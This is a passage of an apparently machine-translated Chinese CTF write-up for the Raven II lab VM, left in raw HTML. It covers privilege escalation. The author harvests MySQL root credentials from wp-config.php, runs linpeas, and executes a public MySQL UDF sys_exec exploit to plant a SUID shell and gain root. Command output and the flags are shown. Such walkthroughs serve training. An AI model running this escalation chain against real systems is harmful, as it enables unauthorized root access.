lx mk bi translated">特权逃避:</h2><p id="6d55" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">收到shell后，我们在<code class="fe nb nc nd mr b">/wordpress/wp-config.php</code>中找到数据库凭证。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="0d9d" class="mv lc iq mr b be mw mx l my mz">/** MySQL database username */<br/>define('DB_USER', 'root');<br/><br/>/** MySQL database password */<br/>define('DB_PASSWORD', 'R@v3nSecurity');</span></pre><blockquote class="nf ng nh"><p id="68f6" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">在<code class="fe nb nc nd mr b">/var/www directory</code>找到了Flag2</p><p id="7a31" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">flag 2 { 6a 8ed 560 f0b 5358 ECF 844108048 EB 337 }</p></blockquote><p id="5def" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在转移linpeas并列举一些潜在的特权点。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oi"><img src="../Images/7883c973403849eb78fc3845505cc628.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*_gqBkyd7BIku_trv"/></div></div></figure><p id="743f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有mysql凭证，我们可以查看这个特定版本是否有任何特权漏洞。</p><div class="nn no gp gr np nq"><a href="https://packetstormsecurity.com/files/151369/MySQL-User-Defined-Linux-x32-x86_64-sys_exec-Privilege-Escalation.html" rel="noopener  ugc nofollow" target="_blank"><div class="nr ab fo"><div class="ns ab nt cl cj nu"><h2 class="bd ir gy z fp nv fr fs nw fu fw ip bi translated">MySQL用户定义(Linux) x32 / x86_64 sys_exec权限提升</h2><div class="nx l"><h3 class="bd b gy z fp nv fr fs nw fu fw dk translated">MySQL用户定义(Linux) x32 / x86_64 sys_exec权限提升作者D7X MySQL用户定义(Linux) x32 /…</h3></div><div class="ny l"><p class="bd b dl z fp nv fr fs nw fu fw dk translated">packetstormsecurity.com</p></div></div></div></a></div><div class="nn no gp gr np nq"><a href="https://github.com/d7x/udf_root/blob/master/udf_root.py" rel="noopener  ugc nofollow" target="_blank"><div class="nr ab fo"><div class="ns ab nt cl cj nu"><h2 class="bd ir gy z fp nv fr fs nw fu fw ip bi translated">主d7x/udf_root处的udf_root/udf_root.py</h2><div class="nx l"><h3 class="bd b gy z fp nv fr fs nw fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="ny l"><p class="bd b dl z fp nv fr fs nw fu fw dk translated">github.com</p></div></div><div class="nz l"><div class="oj l ob oc od nz oe kv nq"/></div></div></a></div><h2 id="350d" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">利用用户定义的函数。</h2><p id="6ecb" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">下载github漏洞并将其传送给受害者。</p><p id="b53d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后运行漏洞并获得一个根外壳。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="59fc" class="mv lc iq mr b be mw mx l my mz">www-data@Raven:/tmp$ ls<br/>linpeas.sh  sh  tmux-33  udf_root.py<br/>www-data@Raven:/tmp$ python2 udf_root.py --username root --password R@v3nSecurity<br/>Plugin dir is /usr/lib/mysql/plugin/<br/>Trying to create a udf library...<br/>UDF library crated successfully: /usr/lib/mysql/plugin/udf1784.so<br/>Trying to create sys_exec...<br/>ERROR 1125 (HY000) at line 1: Function 'sys_exec' already exists<br/>Checking if sys_exec was crated...<br/>sys_exec was found: *************************** 1. row ***************************<br/>name: sys_exec<br/> ret: 2<br/>  dl: udf2422.so<br/>type: function<br/><br/>Generating a suid binary in /tmp/sh...<br/>+-------------------------------------------------------------------------+<br/>| sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') |<br/>+-------------------------------------------------------------------------+<br/>|                                                                       0 |<br/>+-------------------------------------------------------------------------+<br/>Trying to spawn a root shell...<br/># whoami<br/>root</span></pre><p id="03ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在读出<code class="fe nb nc nd mr b">/root/flag4.txt</code>中的flag4。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="e2d3" class="mv lc iq mr b be mw mx l my mz"># cat /root/flag4.txt<br/>  ___                   ___ ___ <br/> | _ \__ ___ _____ _ _ |_ _|_ _|<br/> |   / _` \ V / -_) ' \ | | | | <br/> |_|_\__,_|\_/\___|_||_|___|___|<br/>                           <br/>flag4{df2bc5e951d91581467bb9a2a8ff4425}<br/><br/>CONGRATULATIONS on successfully rooting RavenII<br/><br/>I hope you enjoyed this second interation of the Raven VM<br/><br/>Hit me up on Twitter and let me know what you thought: <br/><br/>@mccannwj / wjmccann.github.io</span></pre><p id="066b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我会在下一个博客中看到你，直到那时快乐的黑客！❤</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ok ol l"/></div></figure></div><div class="ab cl om on hu oo" role="separator"><span class="op bw bk oq or os"/><span class="op bw bk oq or os"/><span class="op bw bk oq or"/></div><div class="ij ik il im in"><h2 id="397f" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae nm" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>